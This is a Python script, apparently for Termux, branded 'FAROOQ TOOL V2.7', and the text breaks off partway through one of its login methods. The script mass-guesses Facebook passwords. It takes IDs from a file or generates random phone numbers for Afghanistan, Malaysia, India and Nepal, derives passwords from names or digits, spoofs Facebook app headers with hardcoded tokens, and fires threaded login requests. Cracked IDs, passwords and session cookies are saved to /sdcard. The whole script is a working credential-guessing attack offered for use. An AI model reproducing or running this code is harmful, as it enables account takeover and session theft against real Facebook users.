#!/usr/bin/env python3
import os
import time
import sys
import lzma
import zlib
import codecs
import base64
import re
import uuid
import json
import string
import random
from pip._vendor import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# ANSI رنګونه د متن لپاره
WHITE_TEXT = "\033[97m"
BOLD = "\033[1m"
RESET = "\033[0m"
UNDERLINE = "\033[4m"

# د بکس لاینونو لپاره رنګونه (طلایی او سرو زرو رنګونه)
GOLD_LINE = "\033[38;2;255;215;0m"
DARK_GOLD = "\033[38;2;184;134;11m"
LIGHT_GOLD = "\033[38;2;255;223;0m"
RED_GOLD = "\033[38;2;255;69;0m"

# د بکس شالید لپاره رنګونه - اصلي شالید
BOX1_BG = "\033[48;2;139;69;19m"
BOX2_BG = "\033[48;2;0;100;80m"

# د 2، 4، 6 کرښو لپاره ځانګړي شالید رنګونه (لومړی بکس)
SPECIAL_BG1_2 = "\033[48;2;205;133;63m"
SPECIAL_BG1_4 = "\033[48;2;210;105;30m"
SPECIAL_BG1_6 = "\033[48;2;155;0;81m"    # #9b0051

# د 2، 4، 6 کرښو لپاره ځانګړي شالید رنګونه (دویم بکس)
SPECIAL_BG2_2 = "\033[48;2;32;178;170m"
SPECIAL_BG2_4 = "\033[48;2;0;139;139m"
SPECIAL_BG2_6 = "\033[48;2;84;0;0m"      # #540000

# د متن هایلایټ رنګونه
BOX2_TEXT_HIGHLIGHT = "\033[38;2;255;215;0m"

# د کرښو لپاره ځانګړي رنگین کوډونه
LINE_BOLD = "\033[1m"

# د پرامپټ درې نښو لپاره - ټول اسماني رنګ
CYAN_ARROW = "\033[96m"

# د بکس لویه کرښه
BOX_LINE = "█"

# د Tool رنګونه
W = '\033[1;97m'
G = '\033[38;5;46m'
R = '\033[38;5;196m'
B = '\x1b[38;5;45m'
Y = "\x1b[38;5;208m"
X = f"{W}[/]"

logo = '''

 ███████╗ █████╗ █████╗░░░██████╗  ██████╗░░░██████╗░░░░░░░░░░██╗███╗░░██╗░█████╗░░░░░  
 ██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔═══██╗ ██╔═══██╗░░░░░░░░░██║████╗░██║██╔══██╗░░░░ 
 █████╗░ ███████║██████╔╝██║░░░██║██║░░░██║ ██║░░░██║░██████╗░██║██╔██╗██║██║░░╚═╝░░░░ 
 ██╔══╝░ ██╔══██║██╔══██╗██║░░░██║██║░░░██║ ██║▄▄░██║░╚═════╝░██║██║╚████║██║░░██╗░░░░  
 ██║░░░░ ██║░░██║██║░░██║╚██████╔╝╚██████╔╝░╚██████╔╝░░░░░░░░░██║██║░╚███║╚█████╔╝░░░░  
 ╚═╝░░░░ ╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░░╚═════╝░░░╚══▀▀═╝░░░░░░░░░░╚═╝╚═╝░░╚══╝░╚════╝░░░░░  V2.7

'''

# د Device معلومات
devices = {
    "Samsung": {
        "Samsung Galaxy S6": {"FBSV": "6.0", "FBDV": "SM-G920F", "density": "2.5", "resolution": (1440, 2560)},
        "Samsung Galaxy J7": {"FBSV": "6.0", "FBDV": "SM-J700F", "density": "2.0", "resolution": (720, 1280)},
        "Samsung Galaxy Note 5": {"FBSV": "7.0", "FBDV": "SM-N920C", "density": "2.6", "resolution": (1440, 2560)},
    },
    "Motorola": {
        "Moto G4": {"FBSV": "7.0", "FBDV": "Moto G4", "density": "2.5", "resolution": (1080, 1920)},
        "Moto E4": {"FBSV": "7.1", "FBDV": "Moto E4", "density": "2.0", "resolution": (720, 1280)},
        "Moto Z2": {"FBSV": "7.1", "FBDV": "Moto Z2", "density": "2.6", "resolution": (1440, 2560)},
    },
}

languages = ["en_US", "en_GB", "en_IN", "bn_BD", "hi_IN"]
fbca_values = ["arm64-v8a:null;]", "arm64-v8a:;]", "armeabi-v7a:armeabi;]"]
fb_version = "427.0.0.31.63"
fb_build = "444411021"

def get_terminal_width():
    try:
        return os.get_terminal_size().columns
    except:
        return 80

def print_centered_big(text):
    terminal_width = get_terminal_width()
    big_text = ""
    for char in text:
        if char.isupper() or char.islower() or char.isdigit():
            big_text += char + " "
        else:
            big_text += char
    if len(big_text) > terminal_width - 4:
        big_text = text
    text_length = len(big_text)
    padding = (terminal_width - text_length) // 2
    if padding < 0:
        padding = 0
    spaces = " " * padding
    mid = len(big_text) // 2
    first_half = big_text[:mid]
    second_half = big_text[mid:]
    print(f"{spaces}", end="")
    print(f"\033[41m\033[97m{BOLD}{UNDERLINE}{first_half}{RESET}", end="")
    print(f"\033[42m\033[97m{BOLD}{UNDERLINE}{second_half}{RESET}")

def clear():
    os.system("clear")

def print_box1():
    width = get_terminal_width()
    line_width = min(width - 4, 70)
    print(f"{LINE_BOLD}{DARK_GOLD}═══════════════════════ {GOLD_LINE}» ───── «◊•» ✠ • ◊ «─────» «═══════════════════{RESET}")
    info_lines = [
        f"  {GOLD_LINE}Developer   >>{WHITE_TEXT} Faroooq Inc",
        f"  {GOLD_LINE}Tool Type   >>{WHITE_TEXT} FILExRANDOM",
        f"  {GOLD_LINE}Github      >>{WHITE_TEXT} github.com/porn-404",
        f"  {GOLD_LINE}Version     >>{WHITE_TEXT} V2.7",
        f"  {GOLD_LINE}Status      >>{WHITE_TEXT} Active",
        f"  {GOLD_LINE}Platform    >>{WHITE_TEXT} Termux"
    ]
    for i, info in enumerate(info_lines):
        if i == 1:
            bg_color = SPECIAL_BG1_2
        elif i == 3:
            bg_color = SPECIAL_BG1_4
        elif i == 5:
            bg_color = SPECIAL_BG1_6
        else:
            bg_color = BOX1_BG
        clean_info = info.replace(GOLD_LINE, '').replace(WHITE_TEXT, '').replace(RESET, '')
        info_len = len(clean_info)
        padding_needed = line_width - info_len - 4
        if padding_needed < 0:
            padding_needed = 0
        print(f"{bg_color}{WHITE_TEXT}{BOLD}{BOX_LINE}{info}{' ' * padding_needed} {BOX_LINE}{RESET}")
    print(f"{LINE_BOLD}{DARK_GOLD}═══════════════ ──•◆•── ────────────────•✦•───────────────────╝{RESET}")

def print_box2():
    width = get_terminal_width()
    line_width = min(width - 4, 70)
    print(f"{LINE_BOLD}{LIGHT_GOLD}═══════════════════════ {RED_GOLD}» ───── «◊•» ✠ • ◊ «─────» «═══════════════════{RESET}")
    info_lines = [
        f"  {WHITE_TEXT}Operator        >> {BOX2_TEXT_HIGHLIGHT}0171{WHITE_TEXT}",
        f"  {WHITE_TEXT}Total Account   >> {BOX2_TEXT_HIGHLIGHT}5000{WHITE_TEXT}",
        f"  {WHITE_TEXT}⚡ Use Airplane (Flight) Mode For Speed Up",
        f"  {WHITE_TEXT}[!] {BOX2_TEXT_HIGHLIGHT}Turn on Flight Mode{WHITE_TEXT}",
        f"  {WHITE_TEXT}Speed           >> {BOX2_TEXT_HIGHLIGHT}MAXIMUM{WHITE_TEXT}",
        f"  {WHITE_TEXT}Connection      >> {BOX2_TEXT_HIGHLIGHT}STABLE{WHITE_TEXT}"
    ]
    for i, info in enumerate(info_lines):
        if i == 1:
            bg_color = SPECIAL_BG2_2
        elif i == 3:
            bg_color = SPECIAL_BG2_4
        elif i == 5:
            bg_color = SPECIAL_BG2_6
        else:
            bg_color = BOX2_BG
        clean_info = info.replace(BOX2_TEXT_HIGHLIGHT, '').replace(WHITE_TEXT, '').replace(RESET, '')
        info_len = len(clean_info)
        padding_needed = line_width - info_len - 4
        if padding_needed < 0:
            padding_needed = 0
        print(f"{bg_color}{BOX2_TEXT_HIGHLIGHT}{BOLD}{BOX_LINE}{info}{' ' * padding_needed} {BOX2_TEXT_HIGHLIGHT}{BOLD}{BOX_LINE}{RESET}")
    print(f"{LINE_BOLD}{LIGHT_GOLD}═══════════════ ──•◆•── ────────────────•✦•───────────────────╝{RESET}")

def show_prompt():
    print(f"\n\033[93m{BOLD}┌─[h4ck3r@termux]-[~]\033[0m")
    print(f"{BOLD}{CYAN_ARROW}└──╼{RESET} {BOLD}{CYAN_ARROW}❯{RESET}{BOLD}{CYAN_ARROW}❯{RESET}{BOLD}{CYAN_ARROW}❯{RESET} \033[0m", end="")

def welcome():
    width = get_terminal_width()
    welcome_text = "⚡ WELCOME TO FAROOQ TOOL ⚡"
    padding = (width - len(welcome_text)) // 2
    if padding < 0:
        padding = 0
    spaces = " " * padding
    print(f"\n{spaces}\033[1;33m{BOLD}{'=' * len(welcome_text)}{RESET}")
    print(f"{spaces}\033[1;32m{BOLD}{welcome_text}{RESET}")
    print(f"{spaces}\033[1;33m{BOLD}{'=' * len(welcome_text)}{RESET}\n")
    time.sleep(1)

# د User Agent تولیدونکي توابع
def tanim():
    brand = random.choice(list(devices.keys()))
    model, specs = random.choice(list(devices[brand].items()))
    carriers = ["T-Mobile", "AT&T", "Verizon", "Jazz", "Telenor", "Zong"]
    language = random.choice(languages)
    fbca = random.choice(fbca_values)
    build_version = random.choice(["SP1A", "TP2A", "RKQ1"])
    numbr = str(random.randint(111111,999999)) + "." + str(random.randint(111,999))
    ua_fb = (f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_build};FBDM/{{density={specs['density']},width={specs['resolution'][0]},height={specs['resolution'][1]}}};FBLC/{language};FBRV/{fb_build};FBCR/{random.choice(carriers)};FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;FBDV/{specs['FBDV']};FBSV/{specs['FBSV']};FBCA/{fbca}")
    dalvik_version = random.choice(["2.1.0", "2.1.2", "2.2.0"])
    ua_dalvik = f"Dalvik/{dalvik_version} (Linux; U; Android {specs['FBSV']}; {specs['FBDV']} Build/{build_version}.{numbr})"
    return f"{ua_dalvik} {ua_fb}"

def sexua():
    android_versions = ['10', '11', '12']
    mobile_models = ['Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5']
    den = random.choice(['{density=3.0,width=1080,height=2401}', '{density=3.0,width=1080,height=2161}'])
    android_version = random.choice(android_versions)
    mobile_model = random.choice(mobile_models)
    x = str(random.randint(11,999))+".1.0."+str(random.randint(11,99))+"."+str(random.randint(11,99))
    xx = ''.join(str(random.randint(0, 9)) for _ in range(9))
    user_agent = f"[FBAN/EMA;FBBV/{xx};FBAV/{x};FBDV/{mobile_model};FBSV/12;FBCX/notifications_push_client_sync_graphql;FBDM/{{density=2.0}}]"
    return user_agent

def user_agent():
    veranduid = ["476.0.0.49.74|454214857", "475.0.0.40.82|454014379"]
    fb_version, fb_uid = random.choice(veranduid).split('|')
    prefix = fb_uid[:2]
    fb_uid_B = prefix + ''.join(random.choices(string.digits, k=len(fb_uid) - 2))
    brand = random.choice(list(devices.keys()))
    model, specs = random.choice(list(devices[brand].items()))
    carriers = ["T-Mobile", "AT&T", "Verizon"]
    language = random.choice(languages)
    fbca = random.choice(fbca_values)
    ua = (f"[FBAN/FB4A;FBAV/{str(random.randint(11,99))}.0.0.{str(random.randint(1111,9999))};FBBV/{str(random.randint(1111111,9999999))};[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_uid};FBDM/{{density={specs['density']},width={specs['resolution'][0]},height={specs['resolution'][1]}}};FBLC/{language};FBRV/{fb_uid_B};FBCR/{random.choice(carriers)};FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;FBDV/{specs['FBDV']};FBSV/{specs['FBSV']};FBOP/19;FBCA/{fbca}]")
    return ua

# د RANDOM کلاس
class RANDOM:
    def __init__(self):
        self.plist = []
        self.oks = []
        self.cps = []
        self.loop = 0
        self.ugen = []
        self.user = []
        self.cok = []
        self.rc = random.choice
        self.rr = random.randint
        self.session = requests.Session()
        self.main()

    def linex(self):
        print(f"{W}------------------------------------------------")

    def main(self):
        clear()
        print_box1()
        print()
        print_box2()
        print()
        width = get_terminal_width()
        print(f"{GOLD_LINE}{BOLD}{'=' * min(width - 4, 60)}{RESET}")
        print(f"{W} [1] File Cloning\n [2] Number Cloning\n [3] Contact Admin (fb) \n [0] {R}Exit")
        self.linex()
        x = input(f" {X} Choice > ")
        if x == "1":
            self.file()
        elif x == "2":
            self.rnd()
        elif x == "3":
            os.system("termux-open https://www.facebook.com/txt.cyber.143")
        elif x == "0":
            sys.exit()
        else:
            self.main()

    def file(self):
        clear()
        print_box1()
        print()
        print_box2()
        print()
        file = input(f" {X} Put File Path > ")
        self.linex()
        try:
            with open(file) as f:
                tani = f.read().splitlines()
        except FileNotFoundError:
            print(f" {X}{R} File Location Not Found.")
            time.sleep(1)
            self.file()
            return
        try:
            pasx = int(input(f" {X} Password Limit > "))
        except ValueError:
            pasx = 15
        self.linex()
        for i in range(pasx):
            self.plist.append(input(f" {X} Put Pas {G}{i+1}{W} > "))
        self.linex()
        print(f" {X} Method {G}1{R}>{G}2{R}>{G}3{W}")
        self.linex()
        mtd = input(f" {X} Choice > ")
        clear()
        print_box1()
        print()
        print_box2()
        print()
        tl = str(len(tani))
        print(f" {X} Total Account > {G}{tl}\n {X} Use Airplane ({R}Flight{W}) Mode For Speed Up")
        self.linex()
        with ThreadPoolExecutor(max_workers=30) as executor:
            for user in tani:
                ids, names = user.split('|')
                passlist = self.plist
                if mtd == "1":
                    executor.submit(self.mtdA, ids, names, passlist, tl)
                elif mtd == "2":
                    executor.submit(self.mtdB, ids, names, passlist, tl)
                else:
                    executor.submit(self.mtdC, ids, names, passlist, tl)
        print("")
        self.linex()
        print(f" {X} Total Ok Account >{G} {len(self.oks)}\n {X} Total Cp Account >{R} {len(self.cps)}")
        self.linex()
        print(f" {X} The Process Has Completed \n {X} Thanks For Using My Tools")
        self.linex()
        sys.exit()

    def mtdA(self, ids, names, passlist, tl):
        try:
            sys.stdout.write(f"\r {W}[FILE]-[{self.loop}] M1|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}")
            sys.stdout.flush()
            first = names.split(' ')[0]
            last = names.split(' ')[1] if len(names.split(' ')) > 1 else 'Khan'
            ps = first.lower()
            ps2 = last.lower()
            for fikr in passlist:
                pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                data = {
                    'adid': str(uuid.uuid4()),
                    'method': 'POST',
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'family_device_id': str(uuid.uuid4()),
                    'secure_family_device_id': str(uuid.uuid4()),
                    'email': ids, 'password': pas,
                    'cpl': 'true', 'credentials_type': 'password',
                    'generate_session_cookies': '1',
                    'error_detail_type': 'button_with_disabled',
                    'generate_machine_id': '1',
                    'os_ver': '5.1',
                    'carrier': 'Banglalink',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'omit_response_on_success': 'false',
                    'enroll_misauth': 'false',
                    'advertising_id': str(uuid.uuid4()),
                    'encrypted_msisdn': '',
                    'fb_api_req_friendly_name': 'authenticate'}
                headers = {
                    'host': 'b-graph.facebook.com',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-connection-bandwidth': str(random.randint(20000,50000)),
                    'x-fb-net-hni': str(random.randint(20000,50000)),
                    'Zero-Rated': '0',
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'User-Agent': user_agent(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-IP': 'True',
                    'x-fb-server-cluster': 'Keep-Alive'}
                po = self.session.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).text
                tst = json.loads(po)
                if 'session_key' in tst:
                    cookie = ";".join(i["name"] + "=" + i["value"] for i in tst["session_cookies"])
                    print(f"\r\r {G}[OK] {ids} | {pas}")
                    with open('/sdcard/FILE-M1-OK.txt', 'a') as f:
                        f.write(ids + '|' + pas + '|' + cookie + '\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in str(tst.get('error', {}).get('message', '')):
                    print(f"\r\r {R}[CP] {ids} | {pas}")
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1
        except:
            time.sleep(10)
            self.mtdA(ids,names,passlist,tl)

    def mtdB(self, ids, names, passlist, tl):
        try:
            sys.stdout.write(f"\r {W}[FILE]-[{self.loop}] M2|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}")
            sys.stdout.flush()
            first = names.split(' ')[0]
            last = names.split(' ')[1] if len(names.split(' ')) > 1 else 'Khan'
            ps = first.lower()
            ps2 = last.lower()
            for fikr in passlist:
                pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                data = {
                    "adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": pas,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_US",
                    "client_country_code": "en_US",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    'User-Agent': tanim(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True'}
                po = self.session.post("https://api.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).text
                tst = json.loads(po)
                if 'session_key' in tst:
                    cookie = ";".join(i["name"] + "=" + i["value"] for i in tst["session_cookies"])
                    print(f"\r\r {G}[OK] {ids} | {pas}")
                    with open('/sdcard/FILE-M2-OK.txt', 'a') as f:
                        f.write(ids + '|' + pas + '|' + cookie + '\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in str(tst.get('error', {}).get('message', '')):
                    print(f"\r\r {R}[CP] {ids} | {pas}")
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1
        except:
            time.sleep(10)
            self.mtdB(ids,names,passlist,tl)

    def mtdC(self, ids, names, passlist, tl):
        try:
            sys.stdout.write(f"\r {W}[FILE]-[{self.loop}] M3|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}")
            sys.stdout.flush()
            first = names.split(' ')[0]
            last = names.split(' ')[1] if len(names.split(' ')) > 1 else 'Khan'
            ps = first.lower()
            ps2 = last.lower()
            for fikr in passlist:
                pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                data = {
                    "adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": pas,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_US",
                    "client_country_code": "en_US",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    'User-Agent': sexua(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True'}
                po = self.session.post("https://graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).text
                tst = json.loads(po)
                if 'session_key' in tst:
                    cookie = ";".join(i["name"] + "=" + i["value"] for i in tst["session_cookies"])
                    print(f"\r\r {G}[OK] {ids} | {pas}")
                    with open('/sdcard/FILE-M3-OK.txt', 'a') as f:
                        f.write(ids + '|' + pas + '|' + cookie + '\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in str(tst.get('error', {}).get('message', '')):
                    print(f"\r\r {R}[CP] {ids} | {pas}")
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1
        except:
            time.sleep(10)
            self.mtdC(ids,names,passlist,tl)

    def rnd(self):
        clear()
        print_box1()
        print()
        print_box2()
        print()
        print(f" [1] Random Afghanistan \n [2] Random Malaysia \n [3] Random India \n [4] Random Nepal")
        self.linex()
        country = input(f" {X} Select > ")
        clear()
        print_box1()
        print()
        print_box2()
        print()
        if country == "1":
            print(f" {X} Ex > 9378, 9371, 9377*")
        elif country == "2":
            print(f" {X} Ex > 0118, 012*, 011*")
        elif country == "3":
            print(f" {X} Ex > 9848,98**, 63**")
        elif country == "4":
            print(f" {X} Ex > 9814, 99**, 98**")
        else:
            print(f" {X} Select Correct Country :)");time.sleep(2)
        self.linex()
        code = input(f" {X} Put Code > ")
        self.linex()
        print(f" {X} Ex > 1000,9999")
        self.linex()
        try:
            limit = int(input(f" {X} Put Limit > "))
        except:
            limit = 99999
        for nmbr in range(limit):
            nmp = ''.join(random.choice(string.digits) for _ in range(7))
            self.user.append(nmp)
        self.linex()
        print(f" [1] Auto Password \n [2] Manual Password")
        self.linex()
        pstype = input(f" {X} Select > ")
        if pstype == "1":
            if country == "1":
                for pasx in ["100200","10002000","500600"]:
                    self.plist.append(pasx)
            elif country == "2":
                for pasx in ["first6","first7","first8"]:
                    self.plist.append(pasx)
        else:
            self.linex()
            try:
                pslimit = int(input(f" {X} Password Limit? > "))
            except:
                pslimit = 8
            self.linex()
            print(f" {X} Ex > first6,last6,first7,etc...")
            self.linex()
            for x in range(pslimit):
                pwx = input(f" {X} Password [{x+1}] > ")
                self.plist.append(pwx)
        clear()
        print_box1()
        print()
        print_box2()
        print()
        print(f" [1] Method [c_user] \n [2] Method [c_user] \n [3] Method [c_user] \n [4] Method [datr] \n [5] Method [c_user]")
        self.linex()
        mtd = input(f" {X} Select > ")
        self.linex()
        print(f" [1] Cracking Speed [Normal] \n [2] Cracking Speed [High]")
        self.linex()
        spd = input(f" {X} Select > ")
        if spd == "1":
            speed = 30
        else:
            speed = 45
        self.linex()
        print(f" {X} Do You Want to Show Cookie ?)")
        self.linex()
        cki = input(f" {X} Select (Y|N) > ")
        if cki in ["n","N","no","NO"]:
            self.cok.append("no")
        else:
            self.cok.append("yes")
        with ThreadPoolExecutor(max_workers=speed) as executor:
            clear()
            print_box1()
            print()
            print_box2()
            print()
            print(f" {X} Operator  > {code} \n {X} Total Account > {G}{limit}\n {X} Use Airplane ({R}Flight{W}) Mode For Speed Up")
            self.linex()
            for love in self.user:
                ids = code+love
                if mtd == "1":
                    executor.submit(self.rA, ids)
                elif mtd == "2":
                    executor.submit(self.rB, ids)
                elif mtd == "4":
                    executor.submit(self.rD, ids)
                elif mtd == "5":
                    executor.submit(self.rE, ids)
                else:
                    executor.submit(self.rC, ids)
        print("")
        self.linex()
        print(f" {X} Total Ok Account >{G} {len(self.oks)}\n {X} Total Cp Account >{R} {len(self.cps)}")
        self.linex()
        print(f" {X} The Process Has Completed \n {X} Thanks For Using My Tools")
        self.linex()
        sys.exit()

    def pwmanager(self, num, typ):
        if 'first' in typ:
            try:
                code = typ.split('t')[1]
                password = num[:int(code)]
            except:
                password = num
        elif 'last' in typ:
            try:
                code = typ.split('t')[1]
                password = num[-int(code):]
            except:
                password = num
        else:
            password = typ
        return password

    def check_lock(self, uid):
        try:
            req = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
            if 'Photoshop' in req:
                return True
            else:
                return False
        except:
            return False

    def rA(self, ids):
        sys.stdout.write(f"\r {W}[RNDM]-[{self.loop}] M1|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}")
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as session:
                    pas = self.pwmanager(ids, pw)
                    data = {
                        'email': ids,
                        'password': pas,
                        'adid': str(uuid.uuid4()),
                        'device_id': str(uuid.uuid4()),
                        'family_device_id': str(uuid.uuid4()),
                        'advertiser_id': str(uuid.uuid4()),
                        'machine_id': str(uuid.uuid4()),
                        'locale': 'bn_BD',
                        'cpl': 'true',
                        'format': 'json',
                        'credentials_type': 'password',
                        'error_detail_type': 'button_with_disabled',
                        'generate_session_cookies': '1',
                        'generate_analytics_claim': '1',
                        'generate_machine_id': '1',
                        'currently_logged_in_userid': '0',
                        'fb_api_req_friendly_name': 'authenticate',
                        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'api_key': '882a8490361da98702bf97a021ddc14d',
                        'method': 'auth.login'}
                    header = {
                        'User-Agent': sexua(),
                        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-HTTP-Engine': 'Liger',
                        'X-FB-Friendly-Name': 'authenticate',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-FB-Client-IP': 'True',
                        'X-FB-Server-Cluster': 'True'}
                    url = 'https://b-graph.facebook.com/auth/login'
                    po = session.post(url, data=data, headers=header).text
                    q = json.loads(po)
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        uid = str(q['uid'])
                        if "no" in self.cok:
                            print(f'\r\r{G}[OK] {ids} | {pas}')
                        else:
                            print(f'\r\r{G}[OK] {ids} | {pas} | {coki[:50]}...')
                        open("/sdcard/RANDOM-M1-Ok.txt", "a").write(uid+"|"+pas+"|"+coki+"\n")
                        self.oks.append(uid)
                        break
                    elif 'www.facebook.com' in str(q.get('error', {}).get('message', '')):
                        print(f"\r\r{R}[CP] {ids} | {pas}")
                        open("/sdcard/RANDOM-M1-Cp.txt", "a").write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop += 1
        except:
            time.sleep(20)
            self.rA(ids)

    def rB(self, ids):
        sys.stdout.write(f"\r {W}[RNDM]-[{self.loop}] M2|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}")
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as session:
                    pas = self.pwmanager(ids, pw)
                    data = {
                        "email": ids,
                        "password": pas,
                        "adid": str(uuid.uuid4()),
                        "device_id": str(uuid.uuid4()),
                        "family_device_id": str(uuid.uuid4()),
                        "locale": "en_US",
                        "cpl": "true",
                        "format": "json",
                        "credentials_type": "password",
                        "error_detail_type": "button_with_disabled",
                        "generate_session_cookies": "1",
                        "generate_analytics_claim": "1",
                        "generate_machine_id": "1",
                        "currently_logged_in_userid": "0",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "api_key": "882a8490361da98702bf97a021ddc14d",
                        "method": "auth.login"
                    }
                    header = {
                        "User-Agent": tanim(),
                        "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                        "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                        "X-FB-Connection-Type": "MOBILE.LTE",
                        "X-FB-HTTP-Engine": "Liger",
                        "X-FB-Friendly-Name": "authenticate",
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                    url = "https://graph.facebook.com/auth/login"
                    po = session.post(url, data=data, headers=header).text
                    q = json.loads(po)
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        uid = str(q['uid'])
                        if "no" in self.cok:
                            print(f'\r\r{G}[OK] {ids} | {pas}')
                        else:
                            print(f'\r\r{G}[OK] {ids} | {pas} | {coki[:50]}...')
                        open("/sdcard/RANDOM-M2-Ok.txt", "a").write(uid+"|"+pas+"|"+coki+"\n")
                        self.oks.append(uid)
                        break
                    elif 'www.facebook.com' in str(q.get('error', {}).get('message', '')):
                        print(f"\r\r{R}[CP] {ids} | {pas}")
                        open("/sdcard/RANDOM-M2-Cp.txt", "a").write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop += 1
        except:
            time.sleep(20)
            self.rB(ids)

    def rC(self, ids):
        sys.stdout.write(f"\r {W}[RNDM]-[{self.loop}] M3|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}")
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as session:
                    pas = self.pwmanager(ids, pw)
                    data = {
                        'adid': str(uuid.uuid4()),
                        'format': 'json',
                        'device_id': str(uuid.uuid4()),
                        'email': ids,
                        'password': pas,
                        'credentials_type': 'password',
                        'source': 'login',
                        'error_detail_type': 'button_with_disabled',
                        'enroll_misauth': 'false',
                        'generate_session_cookies': '1',
                        'generate_machine_id': '1',
